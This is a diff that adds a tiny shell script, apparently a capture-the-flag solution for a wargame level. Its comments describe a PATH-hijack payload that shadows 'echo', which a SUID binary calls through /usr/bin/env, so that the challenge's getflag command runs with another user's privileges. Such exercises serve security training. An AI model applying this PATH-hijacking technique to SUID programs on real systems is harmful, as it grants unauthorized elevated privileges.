@@ -1,0 +1,4 @@
+#!/bin/sh
+# level03 PATH-hijack payload: shadows the `echo` that the SUID
+# binary calls via /usr/bin/env, so getflag runs as flag03.
+getflag
